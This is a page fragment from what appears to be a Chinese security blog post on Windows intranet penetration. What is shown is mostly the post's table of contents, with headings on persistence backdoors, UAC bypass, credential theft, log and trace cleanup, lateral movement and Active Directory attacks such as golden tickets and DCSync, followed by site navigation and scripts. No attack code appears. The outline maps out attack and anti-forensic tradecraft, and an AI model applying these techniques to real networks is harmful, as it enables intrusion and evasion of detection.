class="toc-text"> Winlogon Helper DLL 后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">2.3.</span> <span class="toc-text"> 自启动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 基于注册表的自启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%89%B9%E5%AE%9A%E7%9B%AE%E5%BD%95%E7%9A%84%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 基于特定目录的自启动</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90"><span class="toc-number">3.</span> <span class="toc-text"> 权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#uac"><span class="toc-number">3.1.</span> <span class="toc-text"> UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%A7%A6%E5%8F%91uac%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 会触发 UAC 的操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass"><span class="toc-number">3.1.3.</span> <span class="toc-text"> ByPass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.2.</span> <span class="toc-text"> 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 任意写文件利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mof"><span class="toc-number">3.2.2.</span> <span class="toc-text"> MOF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E7%AA%83%E5%8F%96"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 凭证窃取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-2"><span class="toc-number">3.2.4.</span> <span class="toc-text"> 其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text"> 痕迹清理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97"><span class="toc-number">4.1.</span> <span class="toc-text"> 日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">4.2.</span> <span class="toc-text"> 注册表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE"><span class="toc-number">4.2.1.</span> <span class="toc-text"> 注册表键</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.</span> <span class="toc-text"> 文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#prefetch"><span class="toc-number">4.3.1.</span> <span class="toc-text"> Prefetch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jumplists"><span class="toc-number">4.3.2.</span> <span class="toc-text"> JumpLists</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#amcache-recentfilecachebcf"><span class="toc-number">4.3.3.</span> <span class="toc-text"> Amcache &#x2F; RecentFileCache.bcf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E8%BD%B4"><span class="toc-number">4.4.</span> <span class="toc-text"> 时间轴</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%BB%E5%BA%95%E5%88%A0%E9%99%A4"><span class="toc-number">4.5.</span> <span class="toc-text"> 彻底删除</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">5.</span> <span class="toc-text"> 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%85%A5%E5%8F%A3"><span class="toc-number">5.1.</span> <span class="toc-text"> 常见入口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lolbas"><span class="toc-number">5.2.</span> <span class="toc-text"> LOLBAS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-2"><span class="toc-number">5.2.1.</span> <span class="toc-text"> 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.2.2.</span> <span class="toc-text"> 常见程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msprc"><span class="toc-number">6.</span> <span class="toc-text"> MSPRC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">7.</span> <span class="toc-text"> 域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7"><span class="toc-number">7.1.</span> <span class="toc-text"> 用户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%BB%84%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="toc-number">7.1.1.</span> <span class="toc-text"> 用户组与工作组</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7-2"><span class="toc-number">7.1.1.1.</span> <span class="toc-text"> 用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">7.1.1.2.</span> <span class="toc-text"> 用户组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="toc-number">7.1.1.3.</span> <span class="toc-text"> 工作组</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%B8%AD%E7%94%A8%E6%88%B7"><span class="toc-number">7.1.2.</span> <span class="toc-text"> 域中用户</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">7.1.2.1.</span> <span class="toc-text"> 域用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%BA%E5%99%A8%E7%94%A8%E6%88%B7"><span class="toc-number">7.1.2.2.</span> <span class="toc-text"> 机器用户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">7.1.3.</span> <span class="toc-text"> 组策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.2.</span> <span class="toc-text"> 内网常用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netbios"><span class="toc-number">7.2.1.</span> <span class="toc-text"> NetBIOS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#llmnr"><span class="toc-number">7.2.2.</span> <span class="toc-text"> LLMNR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mdns"><span class="toc-number">7.2.3.</span> <span class="toc-text"> mDNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wpad"><span class="toc-number">7.2.4.</span> <span class="toc-text"> WPAD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F"><span class="toc-number">7.3.</span> <span class="toc-text"> 域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%BB%93%E6%9E%84"><span class="toc-number">7.3.1.</span> <span class="toc-text"> 域结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%A0%91"><span class="toc-number">7.3.1.1.</span> <span class="toc-text"> 域树</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%97"><span class="toc-number">7.3.1.2.</span> <span class="toc-text"> 林</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">7.3.2.</span> <span class="toc-text"> 域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E4%BB%BB"><span class="toc-number">7.3.3.</span> <span class="toc-text"> 信任</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.3.3.1.</span> <span class="toc-text"> 域信任类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ou"><span class="toc-number">7.3.4.</span> <span class="toc-text"> OU</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#active-directory"><span class="toc-number">7.4.</span> <span class="toc-text"> Active Directory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#adds"><span class="toc-number">7.4.1.</span> <span class="toc-text"> ADDS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8D%E7%A7%B0%E7%A9%BA%E9%97%B4"><span class="toc-number">7.4.2.</span> <span class="toc-text"> 名称空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%B1%9E%E6%80%A7"><span class="toc-number">7.4.3.</span> <span class="toc-text"> 对象与属性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#adcs"><span class="toc-number">7.5.</span> <span class="toc-text"> ADCS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">7.5.1.</span> <span class="toc-text"> 介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6"><span class="toc-number">7.5.2.</span> <span class="toc-text"> 证书</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF"><span class="toc-number">7.5.2.1.</span> <span class="toc-text"> 证书模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6%E6%B3%A8%E5%86%8C"><span class="toc-number">7.5.2.2.</span> <span class="toc-text"> 证书注册</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5-2"><span class="toc-number">7.6.</span> <span class="toc-text"> 组策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-3"><span class="toc-number">7.6.1.</span> <span class="toc-text"> 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%A6%82%E5%BF%B5"><span class="toc-number">7.6.2.</span> <span class="toc-text"> 常用概念</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">7.7.</span> <span class="toc-text"> 域内攻击思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.8.</span> <span class="toc-text"> 攻击类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">7.8.1.</span> <span class="toc-text"> 黄金票据利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">7.8.2.</span> <span class="toc-text"> 白银票据利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dcsync%E6%94%BB%E5%87%BB"><span class="toc-number">7.8.3.</span> <span class="toc-text"> DCSync 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dcshadow%E6%94%BB%E5%87%BB"><span class="toc-number">7.8.4.</span> <span class="toc-text"> DCShadow 攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">7.8.5.</span> <span class="toc-text"> 哈希传递攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">7.8.6.</span> <span class="toc-text"> 票据传递攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting-attacks"><span class="toc-number">7.8.7.</span> <span class="toc-text"> Kerberoasting Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#roasting-as-rep"><span class="toc-number">7.8.7.1.</span> <span class="toc-text"> Roasting AS-REP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos-delegation-attacks"><span class="toc-number">7.8.8.</span> <span class="toc-text"> Kerberos Delegation Attacks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">7.8.9.</span> <span class="toc-text"> 其他漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-number">7.9.</span> <span class="toc-text"> 防护</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li class="active"><a href="/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="bookmark" title="Windows内网渗透">Windows内网渗透</a></li><li><a href="/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="bookmark" title="Linux内网渗透">Linux内网渗透</a></li><li><a href="/security/WebNote/Intranet%20penetration/%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/" rel="bookmark" title="后门技术">后门技术</a></li><li><a href="/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/" rel="bookmark" title="综合技巧">综合技巧</a></li><li><a href="/security/WebNote/Intranet%20penetration/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/" rel="bookmark" title="参考文档">参考文档</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="晓楼"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">晓楼</p>
  <div class="description" itemprop="description">GLHF</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">81</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">16</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">123</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL01vYml1cy0w" title="https:&#x2F;&#x2F;github.com&#x2F;Mobius-0"><i class="ic i-github"></i></span>
      <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTIxMzQ0Mjk2ODU=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;2134429685"><i class="ic i-cloud-music"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOnNlYWRyYWdvbjE1OUBvdXRsb29rLmNvbQ==" title="mailto:seadragon159@outlook.com"><i class="ic i-envelope"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a>
  </li>

    
  <li class="item">
    <a href="/favorites/" rel="section"><i class="ic i-star"></i>收藏</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/security/WebNote/Languages%20and%20Frameworks/CSharp/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">晓楼 @ FAF MAVE</span>
  </div>
  <div class="count">
  
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="站点总字数">209k 字</span>

    <span class="post-meta-divider">|</span>

    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="站点阅读时长">4:14</span>
    
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: 'security/WebNote/Intranet penetration/Windows内网渗透/',
    favicon: {
      show: "Incomging Transmission…",
      hide: "Target Loss"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
